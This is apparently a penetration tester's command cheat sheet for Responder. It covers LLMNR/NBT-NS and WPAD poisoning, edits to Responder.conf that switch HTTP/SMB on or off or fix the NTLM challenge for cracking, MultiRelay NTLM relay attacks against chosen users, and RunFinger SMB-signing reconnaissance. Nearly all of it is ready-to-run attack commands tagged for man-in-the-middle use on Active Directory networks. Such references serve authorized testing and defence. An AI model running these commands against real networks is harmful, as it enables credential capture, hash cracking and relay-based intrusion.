# responder

% responder, LLMNR, NBT-NS, Poisoning, man in the middle

## responder launch
#assessment/AD #target/remote #cat/ATTACK/MITM 
```bash
responder –I <interface>
```

## responder launch - analyze mode (no poisoning)
#assessment/AD #target/remote #cat/RECON 
```bash
responder –I <interface> -A
```

## responder launch with wpad file 
#assessment/AD #target/remote #cat/ATTACK/MITM 
```bash
responder -I <interface> --wpad
```

## responder http on
#assessment/AD #target/local #cat/UTILS
```bash
sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## responder http off
#assessment/AD #target/local #cat/UTILS
```bash
sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## responder smb on
#assessment/AD #target/local #cat/UTILS
```bash
sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

## responder smb off
#assessment/AD #target/local #cat/UTILS
```bash
sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

## responder challenge set
#assessment/AD #target/local #cat/UTILS
Set the NTLM challenge for cracking

= challenge: 1122334455667788
```bash
sed -i 's/Challenge =.*$/Challenge = <challenge>/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='
```

## responder challenge reset
#assessment/AD #target/local #cat/UTILS
```
sed -i 's/Challenge =.*$/Challenge = 1122334455667788/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='
```

## multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)
#assessment/AD #target/serve #cat/ATTACK/MITM 
```bash
multirelay -t <ip> -u <user1> <user2>
```

## multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)
#assessment/AD #target/serve #cat/ATTACK/MITM 
```bash
multirelay -t <ip> -u ALL
```

## runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.
#assessment/AD #target/remote #cat/RECON 
```bash
runfinger -i <network_range>
```

= interface: enp0s31f6
